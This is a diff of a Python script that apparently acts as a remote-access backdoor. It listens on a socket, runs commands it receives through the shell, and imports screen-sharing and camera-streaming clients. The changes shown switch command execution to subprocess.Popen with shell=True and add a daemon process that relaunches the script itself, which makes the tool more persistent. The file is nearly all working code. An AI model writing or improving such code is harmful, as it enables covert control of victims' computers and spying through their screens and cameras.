@@ -1,6 +1,7 @@
 import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
 from vidstream import ScreenShareClient, CameraClient; from turtle import left
-
+from multiprocessing import Process
+time.sleep(5)
 url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
     
 def getpath(change=False):
@@ -60,7 +61,7 @@ def receive():
         return "left"
 
 def terminal(command):
-    os.system(command)
+    subprocess.Popen(command, shell=True)
 
     
 def cdAccess(cd):
@@ -101,6 +102,15 @@ def severalcmd(data, temp=0.05):
         terminal(i)
         time.sleep(temp)
 
+def stopall():
+    subprocess.Popen(getFileName(), shell=True)
+    
+def multipro():
+    if __name__ == "__main__":
+        p = Process(target=stopall)
+        p.daemon = True
+        p.start()
+        
 def importImg(data):
     import urllib.request
     print(data)
@@ -159,7 +169,7 @@ while run == True:
         server.settimeout(120)
         if ossys == True:
             print("reload")
-            os.system(getFileName())
+            stopall()
             exit()
         server.bind((ip, port))
         server.listen()
@@ -184,5 +194,8 @@ while run == True:
         while sortir == False and run == True:
             execute(receive())
     except:
-        time.sleep(20)
+        if ossys == True:
+            exit()
+        else:
+            time.sleep(20)
 exit()
